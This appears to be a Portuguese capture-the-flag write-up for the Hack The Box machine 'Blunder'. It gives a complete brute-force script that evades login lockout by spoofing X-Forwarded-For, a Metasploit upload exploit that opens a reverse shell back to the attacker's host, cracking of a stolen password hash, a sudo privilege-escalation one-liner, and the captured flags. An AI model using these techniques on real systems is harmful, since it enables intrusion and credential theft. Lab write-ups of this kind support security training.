---
title: "Blunder"
date: 2020-10-17T22:06:42-03:00
draft: false
---

```bash
nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191

python3 dirsearch.py -u http://10.10.10.191 -e *
```
`wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u "http://10.10.10.191/FUZZ.txt" -t 100` 

```bash
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 3024

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                      
===================================================================

000002755:   200        4 L      23 W     118 Ch      "todo"                                                                                       

Total time: 76.03240
Processed Requests: 3024
Filtered Requests: 3023
Requests/sec.: 39.77251
```
gerando wordlist com palavras do site

`cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/`

deixei minha wordlist criada no  /root, agora pego o script em python do brute force

Crie o arquivo chamado  brute.py

Para executa-lo basta rodar o <comando>   `python3 brute.py`

Dentro do script mude o caminho da sua wordlist, no caso a minha ficou no /root/wordlists.txt

```py
import re
import requests
#from __future__ import print_function

def open_ressources(file_path):
    return [item.replace("\n", "") for item in open(file_path).readlines()]

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = open_ressources('/root/wordlists.txt')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

```bash
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```
Resultado do script ^

Depois disso vc vai ver que tem uma aplicação chamada Bludit CMS rodando no site dentro do 
#http://10.10.10.191/admin/dashboard

Você pode procurar o exploit na internet dessa aplicação
#https://www.exploit-db.com/exploits/47699

```bash
msf5 > use exploit/linux/http/bludit_upload_images_exec
msf5 exploit(linux/http/bludit_upload_images_exec) > set TARGET 0
TARGET => 0
msf5 exploit(linux/http/bludit_upload_images_exec) > set RHOSTS 10.10.10.191
RHOSTS => 10.10.10.191
msf5 exploit(linux/http/bludit_upload_images_exec) > set RPORT 80
RPORT => 80
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf5 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf5 exploit(linux/http/bludit_upload_images_exec) > exploit

[-] Exploit failed: An exploitation error occurred.
[*] Exploit completed, but no session was created.
msf5 exploit(linux/http/bludit_upload_images_exec) > options 
```
Erro encontrado ao rodar o metasploit

investigando o motivo deste erro.

Constatado erro na versão  do metasploit  metasploit `v5.0.94-dev`

a versão stable é a versão  metasploit `v5.0.87-dev`

Essa versão no exploit do meterpreter é setado o LHOSTS automaticamente na porta 4444

```bash
msf5 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.251:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading tmgeRqhFfL.png...
[*] Uploading .htaccess...
[*] Executing tmgeRqhFfL.png...
[*] Sending stage (38288 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.251:4444 -> 10.10.10.191:45134) at 2020-06-29 08:47:30 -0400
[+] Deleted .htaccess

meterpreter > sysinfo
Computer    : blunder
OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > 

meterpreter > shell
Process 4207 created.
Channel 0 created.

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c "import pty;pty.spawn('/bin/bash')"
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ 
```
Entrar no path abaixo e dar um cat no users.php

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

temos a password e os dados do usuário hugo

podemos identificar uma hash dentro de password 

#$ hashid faca404fd5c0a31cf1897b823c695c85cffeb98d

se não identificar pelo comando hashid use um site para decriptografar md5

pode ser o https://md5decrypt.net/en/Sha1

#faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120 
essa password é do user hugo

agora eu saio do usuário de permissão do apache  `www-data`  para o usuário do `Hugo`

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo              
su hugo
Password: Password120

hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ 
```

Dentro da home do hugo tenho o arquivo  user.txt

```bash
hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd ~
cd ~
hugo@blunder:~$ ls
ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
hugo@blunder:~$ cat user.txt    
cat user.txt
d837bfc74affbc6e39b91e489bb9fbb8
hugo@blunder:~$ 
```

obs> auto-complete com <tab> não vai funcionar dentro do meterpreter

# subindo privilegio para root

```bash
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
hugo@blunder:~$ 
```
consigo ver o secure path local

depois disso verificar a versão da bash

```bash
hugo@blunder:~$ bash -version
bash -version
GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
hugo@blunder:~$ 
```

`GNU bash, version 5.0.3`

Pesquisei no google sudo (all root) /bin/bash

Ele deu um link do exploit-db

https://www.exploit-db.com/exploits/47502 

existe um exploit de uma linha que posso especificar pelo id de usuário, no caso do `hugo`  , para conceder a ele o root ALL

uma simples linha >

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash 
sudo -u#-1 /bin/bash
Password: Password120

root@blunder:/home/hugo# 
```
```bash
root@blunder:/home/hugo# cd /root
cd /root
root@blunder:/root# ls
ls
root.txt
root@blunder:/root# cat root.txt
cat root.txt
c5a6c440602c9465a35ba11af04a0910
root@blunder:/root# 
```
basta entrar na home do /root

e visualizar a flag




